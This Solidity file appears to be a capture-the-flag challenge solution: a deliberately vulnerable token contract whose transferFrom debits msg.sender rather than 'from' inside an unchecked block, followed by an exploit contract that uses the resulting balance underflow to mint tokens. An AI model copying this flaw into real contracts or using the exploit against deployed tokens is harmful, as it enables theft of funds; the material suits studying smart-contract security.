// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _player) {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    function _transfer(address to, uint256 value) internal {
        unchecked {
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
        }

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenWhale public tokenWhale;

    constructor(TokenWhale _tokenWhale) {
        tokenWhale = _tokenWhale;
    }

    // write your exploit functions below
    // transfer from checks checks all balances and amounts appropriately but does not check the to and from address for equivelence
    // then _transfer is directly called which does not check any balances or amounts
    // instead it deducts from the msg.sender (as distinct from the `from` address) and adds to the `to` address
    // these are uncheckeed operations so if msg.sender balance is 0 it underflows to a very large amount
    // once the balance is underflowed to a large number we can transfer directly since the msg.sender balance check will pass
    function exploit() public {
        tokenWhale.transferFrom(msg.sender, msg.sender, 1000);
        // at this point address(this) balance has underflowed and is now 2**256 - 1000
        // so we can transfer 1_000_000 tokens to player directly
        tokenWhale.transfer(msg.sender, 1_000_000);
    }
}
